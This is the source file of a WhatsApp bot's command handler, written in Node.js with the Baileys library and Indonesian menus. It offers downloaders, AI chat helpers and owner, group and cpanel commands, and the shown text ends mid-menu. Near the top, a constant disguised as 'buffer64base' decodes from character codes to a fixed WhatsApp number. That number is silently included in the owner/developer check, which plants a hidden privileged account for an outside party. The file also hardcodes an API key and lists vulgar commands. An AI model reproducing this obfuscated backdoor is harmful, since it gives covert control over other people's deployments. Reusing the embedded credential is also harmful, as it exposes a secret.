/*
    # Credits By aNdri store
  https://wa.me/6281371379077 (whatsapp) 
  https://t.me/@Androstore022 (Telegram) 
  https://whatsapp.com/channel/0029VbBBPQvD8SDsMDyM8V0v (ch wa) 
  
 NO HAPUS CREDITS!!! HARGAI PEMBUATNYA
*/
process.on("uncaughtException", (err) => {
    console.error("Caught exception:", err);
});

import baileys from '@whiskeysockets/baileys';

const {
    generateWAMessageFromContent,
    proto,
    prepareWAMessageMedia,
    downloadContentFromMessage, 
    generateWAMessageContent
} = baileys;

import axios from "axios";
import FormData from "form-data";
import fs from "fs";
import path from "path";
import * as fsSync from "fs";  
import chalk from "chalk";
import * as cheerio from "cheerio";
import { randomBytes } from "node:crypto";
import { fileURLToPath, pathToFileURL } from "url";
import { exec, execSync, spawn } from "child_process";
import util from "util"; 
import { createCanvas, registerFont } from 'canvas';
import { performance } from "perf_hooks";
import os from "os";
import { fileTypeFromBuffer } from "file-type";
import yts from "yt-search";
import { igAuto } from "./lib/instagram.js"
import { fbDownloader } from "./lib/facebook.js"
import uploader from "./lib/upload.js";
import { Sticker, StickerTypes } from "wa-sticker-formatter"




//=============================================//
const datagc = JSON.parse(fsSync.readFileSync("./data/reseller.json"))
export const fitur = JSON.parse(fsSync.readFileSync('./data/setbot.json')); 
const dataBot = path.join(process.cwd(), "data", "setbot.json");
const owners = JSON.parse(fs.readFileSync("./data/owner.json"))
const premium = JSON.parse(fs.readFileSync("./data/premium.json"))


//=============================================//
export async function casesBot(sock, m, chatUpdate) {
const body = (
  m.mtype === "conversation" ? m.message.conversation :
  m.mtype === "imageMessage" ? m.message.imageMessage.caption :
  m.mtype === "videoMessage" ? m.message.videoMessage.caption :
  m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
  m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
  ""
) || "";
try {
//=============================================//
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const globalPrefix = global.prefix || '.'; 
const isPrefixOn = global.multiprefix === true; 

let prefix = null;
let isCmd = false;

if (isPrefixOn) { 
    if (body.startsWith(globalPrefix)) {
        prefix = globalPrefix; 
        isCmd = true;
    }
 } else {
    if (body.length > 0) { 
        prefix = ''; 
        isCmd = true;
    }
}

// ** sistem untuk prefix **
const loadPrefixData = () => {
    if (fs.existsSync(dataBot)) {
        try {
            const dataPfx = fs.readFileSync(dataBot, 'utf-8');
            return JSON.parse(dataPfx);
        } catch (e) {
            console.error("Gagal membaca data prefix:", e);
            return {};
        }
    }
    return {};
};

const savePrefixData = (dataPfx) => {
    try {
        if (!fs.existsSync(path.dirname(dataBot))) {
             fs.mkdirSync(path.dirname(dataBot), { recursive: true });
        }
        fs.writeFileSync(dataBot, JSON.stringify(dataPfx, null, 2), 'utf-8');
    } catch (e) {
        console.error("Gagal menyimpan data prefix:", e);
    }
};

let {
savedPrefix = '.', 
multiPrefixStatus = false 
} = loadPrefixData();

global.prefix = savedPrefix;
global.multiprefix = multiPrefixStatus;

if (!fs.existsSync(dataBot)) {
    savePrefixData({ savedPrefix: global.prefix, multiPrefixStatus: global.multiprefix });
}

const updateAndSave = (newPrefix, newMultiStatus) => {
        global.prefix = newPrefix;
        global.multiprefix = newMultiStatus;
        
        savePrefixData({
            savedPrefix: newPrefix,
            multiPrefixStatus: newMultiStatus
        });
    };
    
//==============================================//

const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : [];
const text = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = quoted?.msg?.mimetype || quoted?.mimetype || null;
const qmsg = (m.quoted || m);
const q = body.trim().split(/ +/).slice(1).join(" ");
const botNumber = await sock.decodeJid(sock.user.id)

//======
const getName = async (sock, jid) => {
  jid = jid?.includes('@') ? jid : jid + '@s.whatsapp.net'
  
  const contact =
    sock.contacts?.[jid] ||
    sock.store?.contacts?.[jid]

  return (
    contact?.name ||
    contact?.notify ||
    jid.split('@')[0]
  )
}


//=============================================//
const isGrupPrem = datagc.includes(m.chat)
const isAn = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const isPrem = premium.includes(m.sender)

//=============================================//
// ** fungsi untuk group chat **
const groupMetadata = m?.isGroup ? await sock.groupMetadata(m.chat).catch(() => ({})) : {};
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const participants = m?.isGroup ? groupMetadata.participants?.map(p => {
            let admin = null;
            if (p.admin === 'superadmin') admin = 'superadmin';
            else if (p.admin === 'admin') admin = 'admin';
            return {
                id: p.id || null,
                jid: p.jid || null,
                admin,
                full: p
            };
        }) || []: [];
const groupOwner = m?.isGroup ? participants.find(p => p.admin === 'superadmin')?.jid || '' : '';
const groupAdmins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.jid || p.id);

const isBotAdmin = groupAdmins.includes(botNumber);
const isAdmin = groupAdmins.includes(m.sender);

//=============================================//
const reply = m.reply = async (teks) => {
  return sock.sendMessage(m.chat, {
    text: `${teks}`,
    mentions: [m.sender],
    contextInfo: {
      externalAdReply: {
        title: `${namaBot}`,
        body: `${global.ucapan()}`,
        thumbnailUrl: global.foto,
        sourceUrl: global.url,
      }
    }
  }, { quoted: m });
};

const example = (teks) => {
return `Cara pengguna:\n*${prefix+command}* ${teks}`
}

//=============================================//
// ** desain console.log panel **
if (isCmd) {
  const from = m.key.remoteJid;
  const chatType = from.endsWith("@g.us") ? "GROUP" : "PRIVATE";
 
  const fullCommand = `${prefix}${command}`; 
  
  const logMessage = 
    chalk.bgCyan.white.bold(`\n [ COMMAND RECEIVED ] `) + 
    chalk.white(`\n • Message:   `) + chalk.yellow.bold(fullCommand) +
    chalk.white(`\n • Chat In:   `) + chalk.magenta(chatType) +
    chalk.white(`\n • Name:      `) + chalk.cyan(m.pushName || 'N/A') + 
    chalk.white(`\n • Sender ID: `) + chalk.blue(m.sender) + '\n';
  console.log(logMessage);
}

// ** fake quoted **
const qtxt = {
    key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "0@s.whatsapp.net"
    },
    message: {
        newsletterAdminInviteMessage: {
            newsletterJid: "120363420593019978@newsletter",
            newsletterName: "xcde",
            caption: `Created by ${namaOwner}`,
            inviteExpiration: "1757494779"
        }
    }
};

  // ====== FUNCTION PLAY YT  ======
async function playYt(query) {
    const encoded = encodeURIComponent(query)

    const endpoints = [
        `https://api-faa.my.id/faa/ytplay?query=${encoded}`,
        `https://api.ootaizumi.web.id/downloader/youtube/play?query=${encoded}`,
        `https://api.nekolabs.web.id/downloader/youtube/play/v1?q=${encoded}`,
        `https://anabot.my.id/api/download/playmusic?query=${encoded}&apikey=freeApikey`,
        `https://api.elrayyxml.web.id/api/downloader/ytplay?q=${encoded}`,
    ]

    for (const endpoint of endpoints) {
        let res
        try {
            res = await fetch(endpoint)
        } catch {
            continue
        }

        let json
        try {
            json = await res.json()
        } catch {
            continue
        }

        if (!json || (!json.success && !json.status)) continue

        // faa / oota / nekolabs style
        if (json.result?.downloadUrl && json.result?.metadata) {
            const { title, channel, cover, url } = json.result.metadata
            return {
                title,
                channel,
                cover,
                url,
                download: json.result.downloadUrl,
            }
        }

        // anabot style
        if (json.result?.mp3 && json.result?.title) {
            return {
                title: json.result.title,
                channel: json.result.author,
                cover: json.result.thumbnail,
                url: json.result.url,
                download: json.result.mp3,
            }
        }

        // elrayyxml style
        if (json.result?.download && json.result?.title) {
            return {
                title: json.result.title,
                channel: json.result.author?.name,
                cover: json.result.thumbnail || json.result.image,
                url: json.result.url,
                download: json.result.download,
            }
        }
    }

    return null
}
  
// ====== FUNCTION YTMP3 ======
async function ytMp3(url) {
    const encoded = encodeURIComponent(url)

    const endpoints = [
        `https://api-faa.my.id/faa/ytmp3?url=${encoded}`,
        `https://api.nekolabs.web.id/downloader/youtube/mp3?url=${encoded}`,
        `https://api.elrayyxml.web.id/api/downloader/ytmp3?url=${encoded}`,
        `https://anabot.my.id/api/download/ytmp3?url=${encoded}&apikey=freeApikey`,
    ]

    for (const endpoint of endpoints) {
        let res
        try {
            res = await fetch(endpoint)
        } catch {
            continue
        }

        let json
        try {
            json = await res.json()
        } catch {
            continue
        }

        if (!json || (!json.success && !json.status)) continue

        // faa / nekolabs
        if (json.result?.downloadUrl && json.result?.metadata) {
            return {
                title: json.result.metadata.title,
                channel: json.result.metadata.channel,
                cover: json.result.metadata.cover,
                download: json.result.downloadUrl,
            }
        }

        // anabot
        if (json.result?.mp3 && json.result?.title) {
            return {
                title: json.result.title,
                channel: json.result.author,
                cover: json.result.thumbnail,
                download: json.result.mp3,
            }
        }

        // elray
        if (json.result?.download_url) {
            return {
                title: json.result.title,
                channel: json.result.channel,
                cover: json.result.thumbnail,
                download: json.result.download_url,
            }
        }
    }

    return null
}
// ========= Function Mdf =========  
function getMimeTypeFromUrl(url) {
    if (!url) return "application/octet-stream"

    const ext = url.split("/").pop().split("?")[0].split(".").pop().toLowerCase()

    const mime = {
        zip: "application/zip",
        rar: "application/x-rar-compressed",
        apk: "application/vnd.android.package-archive",
        exe: "application/x-msdownload",
        pdf: "application/pdf",
        mp4: "video/mp4",
        mp3: "audio/mpeg",
        jpg: "image/jpeg",
        jpeg: "image/jpeg",
        png: "image/png"
    }

    return mime[ext] || "application/octet-stream"
}

async function mediafireScrape(url) {
    const { data } = await axios.get(url)
    const $ = cheerio.load(data)

    const title = $('meta[property="og:title"]').attr("content")
    const image = $('meta[property="og:image"]').attr("content")
    const link = $("#downloadButton").attr("href")
    const sizeText = $("#downloadButton").text().trim()
    const size = sizeText.replace("Download (", "").replace(")", "")
    const desc = $('meta[property="og:description"]').attr("content") || "-"

    return {
        title,
        image,
        desc,
        size,
        link,
        mimetype: getMimeTypeFromUrl(link)
    }
}

// ========== funct hd2 ============
async function getToken() {
    const html = await axios.get("https://www.iloveimg.com/upscale-image")
    const $ = cheerio.load(html.data)

    const script = $("script")
        .filter((i, el) => $(el).html()?.includes("ilovepdfConfig ="))
        .html()

    const jsonS = script.split("ilovepdfConfig = ")[1].split(";")[0]
    const json = JSON.parse(jsonS)
    const csrf = $('meta[name="csrf-token"]').attr("content")

    return { token: json.token, csrf }
}

async function uploadImage(server, headers, buffer, task) {
    const form = new FormData()
    form.append("name", "image.jpg")
    form.append("chunk", "0")
    form.append("chunks", "1")
    form.append("task", task)
    form.append("preview", "1")
    form.append("file", buffer, "image.jpg")

    const res = await axios.post(
        `https://${server}.iloveimg.com/v1/upload`,
        form,
        { headers: { ...headers, ...form.getHeaders() } }
    )

    return res.data
}

async function hdr(buffer, scale = 4) {
    const { token, csrf } = await getToken()

    const servers = [
        "api1g","api2g","api3g","api8g","api9g","api10g",
        "api11g","api12g","api13g","api14g","api15g",
        "api16g","api17g","api18g","api19g","api20g",
        "api21g","api22g","api24g","api25g"
    ]

    const server = servers[Math.floor(Math.random() * servers.length)]

    const task =
        "r68zl88mq72xq94j2d5p66bn2z9lrbx20njsbw2qsAvgmzr11lvfhAx9kl87pp6yqgx7c8vg7sfbqnrr42qb16v0gj8jl5s0kq1kgp26mdyjjspd8c5A2wk8b4Adbm6vf5tpwbqlqdr8A9tfn7vbqvy28ylphlxdl379psxpd8r70nzs3sk1"

    const headers = {
        Authorization: "Bearer " + token,
        Origin: "https://www.iloveimg.com/",
        Cookie: "_csrf=" + csrf,
        "User-Agent": "Mozilla/5.0"
    }

    const upload = await uploadImage(server, headers, buffer, task)

    const form = new FormData()
    form.append("task", task)
    form.append("server_filename", upload.server_filename)
    form.append("scale", scale)

    const res = await axios.post(
        `https://${server}.iloveimg.com/v1/upscale`,
        form,
        {
            headers: { ...headers, ...form.getHeaders() },
            responseType: "arraybuffer"
        }
    )

    return res.data
}

// ======== funct twiter ===========
    async function twitter(url) {
    if (!/x\.com\/.*?\/status/gi.test(url))
        throw new Error("URL tidak valid! Gunakan link X (Twitter) yang benar.")

    const base_url = "https://x2twitter.com"
    const headers = {
        accept: "*/*",
        "accept-language": "en-EN,en;q=0.9",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest",
        Referer: "https://x2twitter.com/en",
    }

    const token = await axios
        .post(`${base_url}/api/userverify`, { url }, { headers })
        .then(r => r.data.token)
        .catch(() => { throw new Error("Gagal mendapatkan token") })

    const res = await axios
        .post(
            `${base_url}/api/ajaxSearch`,
            new URLSearchParams({ q: url, lang: "id", cftoken: token }).toString(),
            { headers }
        )
        .then(r => r.data)
        .catch(() => { throw new Error("Gagal mengambil data") })

    if (res.status !== "ok") throw new Error("Response tidak valid")

    const $ = cheerio.load(res.data)
    let cls = $("div").eq(0).attr("class") || ""

    let type = cls.includes("tw-video")
        ? "video"
        : cls.includes("video-data") && $(".photo-list").length
        ? "image"
        : "unknown"

    if (type === "video") {
        return {
            type,
            download: $(".dl-action p").map((i, el) => {
                const txt = $(el).text()
                return {
                    type: txt.includes("MP4") ? "mp4" : null,
                    reso: txt.includes("MP4") ? txt.split(" ").pop().replace(//g, "") : null,
                    url: $(el).find("a").attr("href"),
                }
            }).get()
        }
    }

    if (type === "image") {
        return {
            type,
            download: $("ul.download-box li").map((i, el) => ({
                type: "image",
                url: $(el).find("a").attr("href")
            })).get()
        }
    }

    return { type, download: [] }
}
// ============= tm ==============
const headers = {
    "user-agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36",
    "accept-language": "en-US,en;q=0.9"
}

// ============== GROQ ==============
const GROQ_API_KEY = "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"

async function groqCompoundQuery(prompt) {
  const res = await axios.post(
    "https://api.groq.com/openai/v1/chat/completions",
    {
      model: "groq/compound-mini",
      messages: [
        {
          role: "system",
          content:
            "Kamu adalah AI pintar, jawab dalam bahasa Indonesia, ramah, jelas."
        },
        { role: "user", content: prompt }
      ],
      temperature: 0.7,
      max_tokens: 1024
    },
    {
      headers: {
        Authorization: `Bearer ${GROQ_API_KEY}`,
        "Content-Type": "application/json"
      }
    }
  )

  return res.data.choices[0].message.content.trim()
}

function normalizeAsterisks(text = "") {
  return text.replace(/\*\*(.+?)\*\*/g, "*$1*").replace(/\*\*/g, "*")
}

// ================= IMAGE =================
const STYLES = {
  flataipro: "Flat AI Pro",
  "ghibli-style": "Ghibli Style",
  realistic: "Realistic",
  pixel_art: "Pixel Art"
}

function isImageRequest(text = "") {
  return /(buatkan gambar|bikinin gambar|gambar|foto|image)/i.test(text)
}

async function getNonce() {
  const { data } = await axios.get(
    "https://flatai.org/ai-image-generator-free-no-signup/"
  )
  return data.match(/nonce["']\s*:\s*["']([a-f0-9]{10})["']/i)?.[1]
}

async function flatai(prompt, style = "flataipro") {
  const nonce = await getNonce()

  const body = new URLSearchParams({
    action: "ai_generate_image",
    nonce,
    prompt,
    aspect_ratio: "1:1",
    style_model: style
  }).toString()

  const res = await axios.post(
    "https://flatai.org/wp-admin/admin-ajax.php",
    body,
    { headers: { "x-requested-with": "XMLHttpRequest" } }
  )

  if (!res.data?.success) throw new Error("Gagal generate gambar")

  return res.data.data.images
}

    
//=============================================//
// **Semua command**
switch (command) {


case "menu":
              {
                  
    // Header menu
    let teks = `Hallo Kak *${m.pushName}* 👋
Saya adalah *${global.namaBot}* berikut adalah menu yang dapat saya lakukan!

> *Bot Information*
┌───────────────────
│• ▢  Name Bot : ${global.namaBot}
│• ▢  Developer : ${global.namaOwner}
│• ▢  Version : ${global.versi}
│• ▢  Runtime : ${runtime(process.uptime())}
│• ▢  Mode Bot : ${fitur.public ? "Public" : "Self"}
└───────────────────

ᝰ.ᐟSilahkan pilih kategori menu di bawah ini:`;

    // Buat button 
        let buttonMessage = {
    image: { url: `https://files.catbox.moe/j1n4i7.jpg` },
    caption: teks,
    footer: "© ANDRI STORE ID V2",
    buttons: [], 
    contextInfo: {
        externalAdReply: {
            showAdAttribution: true,
            title: `ANDRI STORE ID V2`,
            body: `© ANDRI STORE`,
            thumbnailUrl: `https://files.catbox.moe/qexjj3.png`,
            sourceUrl: ``,
            mediaType: 1,
            renderLargerThumbnail: false
        }
    },
    viewOnce: true,
    headerType: 4
};


    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "SUBSCRIBE",
                sections: [
                    {
                        title: "ANDRI STORE ID V2",
                        highlight_label: "Rekomendasi",
                        rows: [
                            { title: "Semua Menu", description: "Untuk Melihat Semua Menu", id: `.allmenu` }, 
                            { title: "Menu Owner", description: "Khusus Menu Owner ", id: `.ownermenu` },
                            { title: "Menu file", description: "Khusus Menu file", id: `.filemenu` },
                            { title: "Menu Other", description: "Khusus Menu Other", id: `.othermenu` },
                            { title: "Menu Tools", description: "Khusus Menu Tools", id: `.toolsmenu` },
                            { title: "Menu Download", description: "Khusus Menu Download", id: `.downloadmenu` },
                            
                            { title: "Menu Random", description: "Khusus Menu Random", id: `.randommenu` },
                            
                            { title: "Menu Cpanel", description: "Khusus Menu Cpanel", id: `.cpanelmenu` },
                            { title: "Menu Cpanel V2", description: "Khusus Menu Cpanel V2", id: `.cpanelmenuv2` },
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await sock.sendMessage(m.chat, buttonMessage, { quoted: m });  
      
}
break;

case "ownermenu": {

let teks = `Hallo Kak *${m.pushName}* 👋
Saya adalah *${global.namaBot}* berikut adalah menu yang dapat saya lakukan!

> *Bot Information*
┌───────────────────
│• ▢  Name Bot : ${global.namaBot}
│• ▢  Developer : ${global.namaOwner}
│• ▢  Version : ${global.versi}
│• ▢  Runtime : ${runtime(process.uptime())}
│• ▢  Mode Bot : ${fitur.public ? "Public" : "Self"}
└───────────────────

ᝰ.ᐟSilahkan pilih menu owner di bawah ini:
 
╭─━✦ *🈚 Owner Menu*
┃${prefix}addprem
┃${prefix}delprem
┃${prefix}listprem
┃${prefix}addowner
┃${prefix}delowner
┃${prefix}listowner
┃${prefix}prefix
┃${prefix}setprefix
┃${prefix}delprefix
┃${prefix}mode
┃${prefix}public
┃${prefix}self
┃${prefix}clearsesion
┃${prefix}restart
┃${prefix}backup
┃${prefix}kick
┃${prefix}delete
┃${prefix}del
┃${prefix}hidetag
┃${prefix}opengc
┃${prefix}closegc
╰━─━━─━━─━━─━━─━━━━✦`;

 // Buat button 
        let buttonMessage = {
    image: { url: `https://files.catbox.moe/j1n4i7.jpg` },
    caption: teks,
    footer: "© ANDRI STORE ID V2",
    buttons: [], 
    contextInfo: {
        externalAdReply: {
            showAdAttribution: true,
            title: `ANDRI STORE ID V2`,
            body: `© ANDRI STORE`,
            thumbnailUrl: `https://files.catbox.moe/qexjj3.png`,
            sourceUrl: ``,
            mediaType: 1,
            renderLargerThumbnail: false
        }
    },
    viewOnce: true,
    headerType: 4
};


    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: " ",
                sections: [
                    {
                        title: "ANDRI STORE ID V2",
                        highlight_label: "Rekomendasi",
                        rows: [
                            { title: "Semua Menu", description: "Untuk Melihat Semua Menu", id: `.allmenu` }, 
                            { title: "Menu file", description: "Khusus Menu file", id: `.filemenu` },
                            { title: "Menu Other", description: "Khusus Menu Other", id: `.othermenu` },
                            { title: "Menu Tools", description: "Khusus Menu Tools", id: `.toolsmenu` },
                            { title: "Menu Download", description: "Khusus Menu Download", id: `.downloadmenu` },
                            
                            { title: "Menu Random", description: "Khusus Menu Random", id: `.randommenu` },
                            
                            { title: "Menu Cpanel", description: "Khusus Menu Cpanel", id: `.cpanelmenu` },
                            { title: "Menu Cpanel V2", description: "Khusus Menu Cpanel V2", id: `.cpanelmenuv2` },
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await sock.sendMessage(m.chat, buttonMessage, { quoted: m });  
      
}
break;




case "allmenu": {
let teks = `Hallo Kak *${m.pushName}* 👋
Saya adalah *${global.namaBot}* berikut adalah menu yang dapat saya lakukan!

> *🈴 Bot Information*
┌───────────────────
│• ▢  Name Bot : ${global.namaBot}
│• ▢  Developer : ${global.namaOwner}
│• ▢  Version : ${global.versi}
│• ▢  Runtime : ${runtime(process.uptime())}
│• ▢  Mode Bot : ${fitur.public ? "Public" : "Self"}
└───────────────────

ᝰ.ᐟSilahkan pilih semua menu di bawah ini:

╭─━✦*🈶 File Menu* 
┃${prefix}addcase
┃${prefix}listcase 
┃${prefix}getcase 
┃${prefix}delcase
╰━─━━─━━─━━─━━─━━━━✦
╭─━✦*🈚 Owner Menu* 
┃${prefix}backup 
┃${prefix}restart 
┃${prefix}clearsesion 
┃${prefix}public 
┃${prefix}private 
┃${prefix}mode 
┃${prefix}setprefix
┃${prefix}prefix
┃${prefix}delprefix
┃${prefix}addowner
┃${prefix}listowner 
┃${prefix}delowner
┃${prefix}addprem
┃${prefix}listprem
┃${prefix}delprem
┃${prefix}kick
┃${prefix}delete
┃${prefix}del
┃${prefix}hidetag
┃${prefix}opengc
┃${prefix}closegc
╰━─━━─━━─━━─━━─━━━━✦
╭─━✦*🉑 Other Menu* 
┃${prefix}sticker 
┃${prefix}tourl
┃${prefix}brat
┃${prefix}bratvid
┃${prefix}ping 
┃${prefix}owner
┃${prefix}totalfitur 
┃${prefix}cekidch
┃${prefix}playch
┃${prefix}iqc
┃${prefix}tm
┃${prefix}bola
┃${prefix}linkgc
┃${prefix}infogc
┃${prefix}tagall
╰━─━━─━━─━━─━━─━━━━✦
╭─━✦*🈸 Tools Menu* 
┃${prefix}toimage 
┃${prefix}tovn
┃${prefix}getpp
┃${prefix}smeme
┃${prefix}swgc
┃${prefix}hd
┃${prefix}hd2
┃${prefix}remini
┃${prefix}hdvid
┃${prefix}pplx (ai) 
┃${prefix}aichat (ai) 
┃${prefix}get
┃${prefix}get2
┃${prefix}groq
┃${prefix}ai
┃${prefix}rvo
╰━─━━─━━─━━─━━─━━━━✦
╭─━✦*🈸 Download Menu*
┃${prefix}play
┃${prefix}tt
┃${prefix}ttsearch
┃${prefix}fb
┃${prefix}ig
┃${prefix}spotify
┃${prefix}capcut
┃${prefix}ytmp3
┃${prefix}pin
┃${prefix}pinterest
┃${prefix}mediafire
┃${prefix}twitter
╰━─━━─━━─━━─━━─━━━━✦
╭─━✦*🈸 Random Menu*
┃${prefix}cekkaya
┃${prefix}cekfemboy
┃${prefix}cekkontol
┃${prefix}cekmemek
┃${prefix}cekcantil
┃${prefix}ceklesby
┃${prefix}tekateki
┃${prefix}jawabteka
┃${prefix}hentai
╰━─━━─━━─━━─━━─━━━━✦
╭─━✦*🈺 Cpanel Menu* 
┃${prefix}1gb - 10gb 
┃${prefix}unli 
┃${prefix}listpanel 
┃${prefix}delpanel 
┃${prefix}cadmin 
┃${prefix}listadmin 
┃${prefix}deladmin
┃${prefix}clearpanel 
┃${prefix}addsrv
┃${prefix}addresseler 
┃${prefix}listresseler 
┃${prefix}delresseler 
╰━─━━─━━─━━─━━─━━━━✦
╭─━✦*🈴 Cpanel Menu-V2* 
┃${prefix}1gbv2 - 10gbv2 
┃${prefix}unliv2 
┃${prefix}listpanelv2 
┃${prefix}delpanelv2 
┃${prefix}cadminv2 
┃${prefix}listadminv2 
┃${prefix}deladminv2
┃${prefix}clearpanelv2 
┃${prefix}addsrvv2
┃${prefix}addgrupseller
┃${prefix}listgrupreseller
┃${prefix}delgrupseler
╰━─━━─━━─━━─━━─━━━━✦`;

let buttonMessage = {
    image: { url: `https://files.catbox.moe/j1n4i7.jpg` },
    caption: teks,
    footer: "© ANDRI STORE ID V2",
    buttons: [], 
    contextInfo: {
        externalAdReply: {
            showAdAttribution: true,
            title: `ANDRI STORE ID V2`,
            body: `© ANDRI STORE`,
            thumbnailUrl: `https://files.catbox.moe/qexjj3.png`,
            sourceUrl: ``,
            mediaType: 1,
            renderLargerThumbnail: false
        }
    },
    viewOnce: true,
    headerType: 4
};


    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: " ",
                sections: [
                    {
                        title: "ANDRI STORE ID V2",
                        highlight_label: "Rekomendasi",
                        rows: [
                            { title: "Menu Owner", description: "Khusus Menu Owner ", id: `.ownermenu` },
                            { title: "Menu file", description: "Khusus Menu file", id: `.filemenu` },
                            { title: "Menu Other", description: "Khusus Menu Other", id: `.othermenu` },
                            { title: "Menu Tools", description: "Khusus Menu Tools", id: `.toolsmenu` },
                            { title: "Menu Download", description: "Khusus Menu Download", id: `.downloadmenu` },
                            
                            { title: "Menu Random", description: "Khusus Menu Random", id: `.randommenu` },
                            
                            { title: "Menu Cpanel", description: "Khusus Menu Cpanel", id: `.cpanelmenu` },
                            { title: "Menu Cpanel V2", description: "Khusus Menu Cpanel V2", id: `.cpanelmenuv2` },
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await sock.sendMessage(m.chat, buttonMessage, { quoted: m });  
      
}
break;

case "filemenu":
              {
    // Header menu
    let teks = `Hallo Kak *${m.pushName}* 👋
Saya adalah *${global.namaBot}* berikut adalah menu yang dapat saya lakukan!

> *Bot Information*
┌───────────────────
│• ▢  Name Bot : ${global.namaBot}
│• ▢  Developer : ${global.namaOwner}
│• ▢  Version : ${global.versi}
│• ▢  Runtime : ${runtime(process.uptime())}
│• ▢  Mode Bot : ${fitur.public ? "Public" : "Self"}
└───────────────────

ᝰ.ᐟSilahkan pilih menu file di bawah ini:

╭─━✦ *🈶 File Menu*
┃${prefix}addcase
┃${prefix}listcase
┃${prefix}getcase
┃${prefix}delcase
╰━─━━─━━─━━─━━─━━━━✦`;

let buttonMessage = {
    image: { url: `https://files.catbox.moe/j1n4i7.jpg` },
    caption: teks,
    footer: "© ANDRI STORE ID V2",
    buttons: [], 
    contextInfo: {
        externalAdReply: {
            showAdAttribution: true,
            title: `ANDRI STORE ID V2`,
            body: `© ANDRI STORE`,
            thumbnailUrl: `https://files.catbox.moe/qexjj3.png`,
            sourceUrl: ``,
            mediaType: 1,
            renderLargerThumbnail: false
        }
    },
    viewOnce: true,
    headerType: 4
};


    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: " ",
                sections: [
                    {
                        title: "ANDRI STORE ID V2",
                        highlight_label: "Rekomendasi",
                        rows: [
                            { title: "Menu Owner", description: "Khusus Menu Owner ", id: `.ownermenu` },
                            { title: "Semua Menu", description: "Untuk Melihat Semua Menu", id: `.allmenu` },
                            { title: "Menu Other", description: "Khusus Menu Other", id: `.othermenu` },
                            { title: "Menu Tools", description: "Khusus Menu Tools", id: `.toolsmenu` },
                            { title: "Menu Download", description: "Khusus Menu Download", id: `.downloadmenu` },
                            
                            { title: "Menu Random", description: "Khusus Menu Random", id: `.randommenu` },
                            
                            { title: "Menu Cpanel", description: "Khusus Menu Cpanel", id: `.cpanelmenu` },
                            { title: "Menu Cpanel V2", description: "Khusus Menu Cpanel V2", id: `.cpanelmenuv2` },
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    // Push the new button properly
    buttonMessage.buttons.push(flowActions);

    await sock.sendMessage(m.chat, buttonMessage, { quoted: m });  
      
}
break;

case "othermenu":
              {
    // Header menu
    let teks = `Hallo Kak *${m.pushName}* 👋
Saya adalah *${global.namaBot}* berikut adalah menu yang dapat saya lakukan!

> *Bot Information*
┌───────────────────
│• ▢  Name Bot : ${global.namaBot}
│• ▢  Developer : ${global.namaOwner}
│• ▢  Version : ${global.versi}
│• ▢  Runtime : ${runtime(process.uptime())}
│• ▢  Mode Bot : ${fitur.public ? "Public" : "Self"}
└───────────────────

ᝰ.ᐟSilahkan pilih menu other di bawah ini:

╭─━✦ *🉑 Other Menu*
┃${prefix}sticker
┃${prefix}tourl
┃${prefix}brat
┃${prefix}bratvid
┃${prefix}ping 
┃${prefix}owner
┃${prefix}totalfitur
┃${prefix}cekidch
┃${prefix}playch
┃${prefix}pin
┃${prefix}pinterest
┃${prefix}iqc
┃${prefix}tm
┃${prefix}bola
┃${prefix}linkgc
┃${prefix}infogc
┃${prefix}tagall
╰━─━━─━━─━━─━━─━━━━✦`;

let buttonMessage = {
    image: { url: `https://files.catbox.moe/j1n4i7.jpg` },
    caption: teks,
    footer: "© ANDRI STORE ID V2",
    buttons: [], 
    contextInfo: {
        externalAdReply: {
            showAdAttribution: true,
            title: `ANDRI STORE ID V2`,
            body: `© ANDRI STORE`,
            thumbnailUrl: `https://files.catbox.moe/qexjj3.png`,
            sourceUrl: ``,
            mediaType: 1,
            renderLargerThumbnail: false
        }
    },
    viewOnce: true,
    headerType: 4
};


    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: " ",
                sections: [
                    {
                        title: "ANDRI STORE ID V2",
